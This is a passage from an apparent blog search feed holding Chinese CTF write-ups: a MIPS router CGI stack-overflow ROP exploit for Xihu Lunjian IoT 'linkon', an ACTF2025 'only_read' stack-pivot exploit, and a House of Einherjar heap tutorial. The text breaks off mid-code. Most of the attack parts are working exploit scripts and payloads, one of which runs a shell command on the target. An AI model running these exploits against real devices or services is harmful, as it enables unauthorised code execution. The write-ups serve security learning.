<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>第八届西湖论剑初赛IOT-linkon的wp</title>
      <link href="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/"/>
      <url>/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>最近开始学习IOT了，做了一下今年年初的西湖论剑的IOT题目，过程还是挺坎坷的，记录下过程。:yum:</p><h3 id="0x01-启动"><a href="#0x01-启动" class="headerlink" title="0x01:启动"></a>0x01:启动</h3><p>题目给出了启动脚本，但是我们想要调试程序的话，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gdbserver :1234 --attach PID</span><br></pre></td></tr></table></figure><p>是没法在宿主机中访问到gdbserver开启的端口的</p><p>需要修改一下脚本，加一个端口映射。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot;  -net user,hostfwd=tcp::80-:80,hostfwd=tcp::2222-:22,hostfwd=tcp::1234-:1234 -net nic -nographic</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x02-分析程序"><a href="#0x02-分析程序" class="headerlink" title="0x02:分析程序"></a>0x02:分析程序</h3><p>启动服务后，随便输点东西</p><p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515203302063.png" alt="image-20250515203302063"></p><p>会发现程序到了cgi-bin目录下的login.cgi</p><p>分析这个文件</p><p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515210006878.png" alt="image-20250515210006878"></p><p>32位mips程序</p><p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515204142171.png" alt="image-20250515204142171"></p><p>web_get函数读入一个参数page,</p><p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515204219221.png" alt="image-20250515204219221"></p><p>page参数等于Goto_chidx时，程序向下执行会进入Goto_chidx函数，</p><p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515204336900.png" alt="image-20250515204336900"></p><p>其中的sprintf函数存在栈溢出，控制好参数wlanUrl即可通过sprintf放入v9,造成栈溢出</p><h3 id="0x03-验证漏洞"><a href="#0x03-验证漏洞" class="headerlink" title="0x03:验证漏洞"></a>0x03:验证漏洞</h3><p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515205351181.png" alt="image-20250515205351181"></p><p>可以看到手动把page改为函数名，通过设置wlanUrl，可以让程序返回500，成功验证漏洞</p><h3 id="0x04-调试程序"><a href="#0x04-调试程序" class="headerlink" title="0x04:调试程序"></a>0x04:调试程序</h3><p>我们可以通过用gdbserver来调试程序<a href="https://github.com/rapid7/embedded-tools/blob/master/binaries/gdbserver/gdbserver.mipsle">gdbserver下载地址，32位mips</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gdbserver.mipsle :1234 --attach PID</span><br></pre></td></tr></table></figure><p>PID为要调试进程的PID，可以通过ps -ef查看，</p><p>但是我们要调试的程序在瞬间结束的，无法通过正常方式调试到想要的函数</p><p>这时候我们可以通过把程序想要调试的部分提前在ida中patch出一个循环，让程序卡在那里，同样我们的gdb也会卡在这里，再用set命令，调整回来，即可实现调试想要调试的部分</p><p>这里我选择patch掉0x4039FC处的代码，正好再return的nop之前</p><p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515210905239.png" alt="image-20250515210905239"></p><p>mips中无限循环的语句是<br>FF FF 00 10</p><p>修改后效果</p><p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515211010924.png" alt="image-20250515211010924"></p><p>替换掉qemu中原本的login,cgi</p><p>调试脚本:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">url = &quot;http://192.168.2.129/cgi-bin/login.cgi&quot;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Host&quot;: &quot;192.168.2.129&quot;,</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0&quot;,</span><br><span class="line">    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,</span><br><span class="line">    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;,</span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;,</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,</span><br><span class="line">    &quot;Origin&quot;: &quot;http://192.168.2.129&quot;,</span><br><span class="line">    &quot;Connection&quot;: &quot;keep-alive&quot;,</span><br><span class="line">    &quot;Referer&quot;: &quot;http://192.168.2.129/&quot;,</span><br><span class="line">    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;Priority&quot;: &quot;u=0, i&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*0x100</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;page&#x27;: &#x27;Goto_chidx&#x27;,</span><br><span class="line">    &#x27;wlanUrl&#x27;: payload,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, headers=headers, data=data)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>调试时候启动这个脚本，再ps -ef</p><p>可以看到</p><p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515211411972.png" alt="image-20250515211411972"></p><p>多出一条与login.cgi路径很接近的进程,在启动脚本之前是没有的，猜测这就是卡住的login.cgi</p><p>gdbserver这个进程后，</p><p>在宿主机中启动gdb-multiarch 连上1234端口</p><p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515211705573.png" alt="image-20250515211705573"></p><p>发现程序停在了预定patch的循环处，然后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set *0x4039fc=0x8f998078</span><br></pre></td></tr></table></figure><p>把程序patch回来</p><p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515211802716.png" alt="image-20250515211802716"></p><p>即可进行正常调试</p><h3 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05:漏洞利用"></a>0x05:漏洞利用</h3><p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515213717964.png" alt="image-20250515213717964"></p><p>在进行跳转之前有这些指令可以供我们来控制ra,s2,s1,s0</p><p>之后用到了两条gadgets</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># .fini:0000A554                 lw      $gp, 16($sp)</span></span><br><span class="line"><span class="comment"># .fini:0000A558                 nop</span></span><br><span class="line"><span class="comment"># .fini:0000A55C                 lw      $ra, 28($sp)</span></span><br><span class="line"><span class="comment"># .fini:0000A560                 jr      $ra</span></span><br></pre></td></tr></table></figure><p>用来恢复gp,</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># .text:00007978                 la      $t9, -0x7f38($gp)</span></span><br><span class="line"><span class="comment"># .text:0000797C                 nop</span></span><br><span class="line"><span class="comment"># .text:00007980                 jalr    $t9 </span></span><br><span class="line"><span class="comment"># .text:00007984                 move    $a0, $s0</span></span><br></pre></td></tr></table></figure><p>用来执行do_system</p><p>参数由s0传入a0</p><p>通过在payload中设置关于sp的各种偏移，</p><p>最终执行dosystem</p><h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">url = &quot;http://192.168.2.129/cgi-bin/login.cgi&quot;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Host&quot;: &quot;192.168.2.129&quot;,</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0&quot;,</span><br><span class="line">    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,</span><br><span class="line">    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;,</span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;,</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,</span><br><span class="line">    &quot;Origin&quot;: &quot;http://192.168.2.129&quot;,</span><br><span class="line">    &quot;Connection&quot;: &quot;keep-alive&quot;,</span><br><span class="line">    &quot;Referer&quot;: &quot;http://192.168.2.129/&quot;,</span><br><span class="line">    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;Priority&quot;: &quot;u=0, i&quot;</span><br><span class="line">&#125;</span><br><span class="line">v9=0x7fff64c0</span><br><span class="line">libc_base=0x77e1e000 #/root/cpio-root/lib/libwebutil.so</span><br><span class="line">stack = 0x7fff6610</span><br><span class="line"></span><br><span class="line">payload = b&quot;a&quot;*0x80</span><br><span class="line">payload += p32(stack+0x20-0xa0)# $s0</span><br><span class="line">payload += b&quot;a&quot;*8</span><br><span class="line">payload += p32(libc_base+0xa554)</span><br><span class="line">payload += b&quot;b&quot;*16</span><br><span class="line">payload += p32(0x77e7b550)# $gp</span><br><span class="line">payload += b&quot;c&quot;*8</span><br><span class="line">payload += p32(libc_base+0x7978)</span><br><span class="line">payload += b&quot;a&quot;*0x20</span><br><span class="line">payload += b&quot;cp /flag /etc_ro/lighttpd/www/bbb.txt;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;page&#x27;: &#x27;Goto_chidx&#x27;,</span><br><span class="line">    &#x27;wlanUrl&#x27;: payload,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, headers=headers, data=data)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>把文件恢复后</p><p>可以通过访问bbb.txt看到打印出的flag</p><p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515220041487.png" alt="image-20250515220041487"></p><h3 id="0x06-参考文章"><a href="#0x06-参考文章" class="headerlink" title="0x06:参考文章"></a>0x06:参考文章</h3><p><a href="https://zikh26.github.io/posts/65d308c5.html">第八届西湖论剑初赛IOT-linkon的wp | ZIKH26’s Blog</a></p><p><a href="https://ch13hh.github.io/2025/03/28/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-inkon/">西湖论剑IOT-inkon - CH13hh</a></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> iot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF2025 pwn 部分wp</title>
      <link href="/2025/04/27/ACTF2025%20pwn%20%E9%83%A8%E5%88%86wp/"/>
      <url>/2025/04/27/ACTF2025%20pwn%20%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>早在 TGCTF 就遇到过只有这种 只有 read 的题目了，没想到这次还是没做出来，真是报应啊～</p><h3 id="0x01-only-read"><a href="#0x01-only-read" class="headerlink" title="0x01  only_read"></a>0x01  only_read</h3><p>先放脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from tools import*</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">p=process(&quot;./only_read&quot;)</span><br><span class="line"></span><br><span class="line">add1 = 0x000000000040111c  # add dword ptr [rbp - 0x3d], ebx ; nop ; ret</span><br><span class="line">pop_rbp = 0x000000000040111d  # pop rbp ; ret</span><br><span class="line">add2 = 0x000000000040110c  # adc edx, [rbp + 0x48]; mov ebp, esp; call 0x3090; mov byte ptr [rip + 0x2efb], 1; pop rbp; ret</span><br><span class="line">start=0x40105d</span><br><span class="line">leave_ret=0x000000000040115d</span><br><span class="line">bss = 0x404000</span><br><span class="line">offset=0x0c52a0-0x801 #原本有0x800,adc有个1,#(ogg-libc_start_main+139)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug(p,0x40115d)</span><br><span class="line"></span><br><span class="line">payload1=b&#x27;a&#x27;*0x80+p64(bss+0xf00)+p64(0x0401142)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2=b&#x27;a&#x27;*0x80+p64(bss+0xf90)+p64(start)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">pause()</span><br><span class="line">                                                #rbp </span><br><span class="line">paylaod3=b&#x27;a&#x27;*0x80+p64(0x404dc0+8)+p64(add2)+p64(bss+0xf90)+p64(start)+p64(offset)</span><br><span class="line">p.sendline(paylaod3)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload4=b&#x27;a&#x27;*0x80+p64(0x404d98+0x3d)+p64(add1)+p64(pop_rbp)+p64(0x404d98-0x8)+p64(leave_ret)</span><br><span class="line">p.sendline(payload4)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目只给了一个read函数有很大的溢出，无输出</p><p>第一次栈溢出，读入payload1,返回到main中的read函数，读入payload2到bss段内，</p><p>随着正常的程序执行流，程序执行一次leave:ret ,把栈迁移到bss段，程序执行payload2读入的start，实际为_start+13的地址，然后执行到libc_start_main,程序再次来到main函数，此时看栈的情况会发现在bss段的栈中出现了一些ibc地址，如__libc_start_main+139</p><p><img src="/2025/04/27/ACTF2025%20pwn%20%E9%83%A8%E5%88%86wp/image-20250427200231745.png" alt="image-20250427200231745"></p><p>因为执行到了main函数，程序会再次执行一次read，读入payload3,</p><p>payload3通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adc edx, [rbp + 0x48]; mov ebp, esp; call 0x3090; mov byte ptr [rip + 0x2efb], 1; pop rbp; ret</span><br></pre></td></tr></table></figure><p>这条指令把libc_start_main+139与偏移为0xef52b的onegadget的偏移通过控制rbp,填入edx中，</p><p><img src="/2025/04/27/ACTF2025%20pwn%20%E9%83%A8%E5%88%86wp/image-20250427200556562.png" alt="image-20250427200556562"></p><p>然后再次执行一次start，在</p><p><img src="/2025/04/27/ACTF2025%20pwn%20%E9%83%A8%E5%88%86wp/image-20250427200938386.png" alt="image-20250427200938386"></p><p>_libc_start_main+23处会把rdx的值移到rbx中</p><p>并且在回到main时，此值不变。</p><p><img src="/2025/04/27/ACTF2025%20pwn%20%E9%83%A8%E5%88%86wp/image-20250427201140754.png" alt="image-20250427201140754"></p><p>之后再次栈溢出读入payload4,</p><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add dword ptr [rbp - 0x3d], ebx ; nop ; ret</span><br></pre></td></tr></table></figure><p>控制rbp把ebx中的偏移加到栈中的libc地址上最终得到</p><p><img src="/2025/04/27/ACTF2025%20pwn%20%E9%83%A8%E5%88%86wp/image-20250427201553712.png" alt="image-20250427201553712"></p><p>一个ogg的地址</p><p>然后栈迁移到ogg处，执行system(“&#x2F;bin&#x2F;sh”)</p><p><img src="/2025/04/27/ACTF2025%20pwn%20%E9%83%A8%E5%88%86wp/image-20250427201803858.png" alt="image-20250427201803858"></p><p>getshell.</p><p><img src="/2025/04/27/ACTF2025%20pwn%20%E9%83%A8%E5%88%86wp/image-20250427201823841.png" alt="image-20250427201823841"></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>house of einherjar</title>
      <link href="/2025/03/03/house%20of%20einherjar/"/>
      <url>/2025/03/03/house%20of%20einherjar/</url>
      
        <content type="html"><![CDATA[<h3 id="House-of-einherjar"><a href="#House-of-einherjar" class="headerlink" title="House of einherjar"></a>House of einherjar</h3><h4 id="0x01-简要介绍"><a href="#0x01-简要介绍" class="headerlink" title="0x01.简要介绍"></a>0x01.简要介绍</h4><p>house of einherjar可以让malloc返回一个任意大小的chunk,但条件有点苛刻::disappointed_relieved:</p><p>House Of Einherjar通过溢出修改chunk的prev_size和prev_inuse，</p><p>将prev_inuse改为0，让正常chunk被标记位被释放，</p><p>prev_size改为目标地址和正常chunk之间的距离,让正常chunk释放时去找fake chunk. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size(p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在目标地址构造fake_chunk，需要伪造size位和fd,bk,fd和bk均指向chunk头部。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>)) \</span><br><span class="line">malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure><p>通过释放正常的chunk触发向后合并让目标地址落入unsorted bin,</p><p>由于放入了unsorted bin,为了绕过检测，还需将fd,bk再次改为main_arena的地址</p><p>适用范围：存在off-by-null&#x2F;off-by-one漏洞，可以在目标地址上构造fake chunk头。</p><h4 id="例题分析：2016-seccon-tinypad"><a href="#例题分析：2016-seccon-tinypad" class="headerlink" title="例题分析：2016_seccon_tinypad"></a>例题分析：2016_seccon_tinypad</h4><p>版本：2.23</p><h4 id="0x02-保护分析"><a href="#0x02-保护分析" class="headerlink" title="0x02.保护分析"></a>0x02.保护分析</h4><p><img src="/2025/03/03/house%20of%20einherjar/image-20250306191601986.png" alt="image-20250306191601986"></p><p>没有开启PIE,got表不可改。</p><h4 id="0x03-功能分析"><a href="#0x03-功能分析" class="headerlink" title="0x03.功能分析"></a>0x03.功能分析</h4><p>程序有4个功能add,delete ,edit,exit</p><p><img src="/2025/03/03/house%20of%20einherjar/image-20250306183846165.png" alt="image-20250306183846165"></p><p>add功能最多申请4个chunk，并且限制申请堆块最大为0x100</p><p><img src="/2025/03/03/house%20of%20einherjar/QQ_1741257636924.png" alt="img"></p><p>delete功能不会清空chunk list,存在UAF</p><p><img src="/2025/03/03/house%20of%20einherjar/image-20250306184641027.png" alt="image-20250306184641027"></p><p>edit功能会先strlen当前要edit的chunk，然后以此作为edit功能输入的最大长度，然后会把输入的内容存储到bss段的tinypad中，同时chunklist也在tinypad中，但是在0x100字节之上，无法覆盖。</p><p><img src="/2025/03/03/house%20of%20einherjar/QQ_1741259050326.png" alt="img"></p><p>程序的read_until功能存在off-by-null漏洞。</p><h4 id="0x03-编写exp"><a href="#0x03-编写exp" class="headerlink" title="0x03.编写exp"></a>0x03.编写exp</h4><p>#此程序下标从1开始，且每次输出菜单界面，都会附带输出4个chunk的内容</p><h5 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x70</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)  </span><br><span class="line">add(<span class="number">0x70</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span>)  </span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">&#x27;c&#x27;</span> * <span class="number">8</span>)  </span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">&#x27;c&#x27;</span> * <span class="number">8</span>)  <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;TENT&quot;</span>+<span class="string">&quot;\x3a\x20&quot;</span>)</span><br><span class="line">heap_addr=u32(p.recv(<span class="number">4</span>))-<span class="number">0x80</span></span><br><span class="line">log_addr(<span class="string">&quot;heap_addr&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\x33&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;TENT&quot;</span>+<span class="string">&quot;\x3a\x20&quot;</span>)</span><br><span class="line"></span><br><span class="line">data=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc_addr=data-<span class="number">0x3c4b78</span></span><br><span class="line">main_arena=data-<span class="number">88</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>通过UAF，泄露出堆地址,libc地址,和main_arena地址，然后free掉chunk4.</p><h5 id="构造利用条件"><a href="#构造利用条件" class="headerlink" title="构造利用条件"></a>构造利用条件</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">0xf8</span>+<span class="string">&quot;\x11&quot;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">&#x27;c&#x27;</span> * <span class="number">0xf8</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">&#x27;d&#x27;</span> * <span class="number">0xf8</span>)<span class="comment">#4</span></span><br><span class="line">fake_chunk=p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(tinypad_addr+<span class="number">0x20</span>)*<span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p64(offset))-<span class="built_in">len</span>(p64(offset).strip(<span class="string">b&#x27;\x00&#x27;</span>))+<span class="number">1</span>):</span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(offset).strip(<span class="string">b&#x27;\x00&#x27;</span>).rjust(<span class="number">8</span>-i,<span class="string">b&#x27;f&#x27;</span>))    </span><br><span class="line">    <span class="comment">#通过off-by-null把存储在的chunk2的prev_size位上的填充字节去除,只留下与fake_chunk间的距离。</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+fake_chunk)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>计算出fake_chunk和正常chunk间的offset，再次计算出其中有几个\x00,通过循环，每次减少一个字节，通过read_until的off-by-null,把正常数据覆盖位\x00,在prev_size上构造出offset</p><p>然后edit chunk2，借此在tinypad高0x20位的地址上构造fake_chunk,</p><p>然后free(2),触发house of einherjar</p><p>可以看到unsorted bin中成功出现tinypad<br><img src="/2025/03/03/house%20of%20einherjar/image-20250306192449579.png" alt="image-20250306192449579"></p><p>然后再次edit,修改其fd,bk为main_arena</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(main_arena)*<span class="number">2</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;(INDEX)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;(CONTENT)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Is it OK?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br></pre></td></tr></table></figure><h5 id="onegadget改返回地址"><a href="#onegadget改返回地址" class="headerlink" title="onegadget改返回地址"></a>onegadget改返回地址</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span 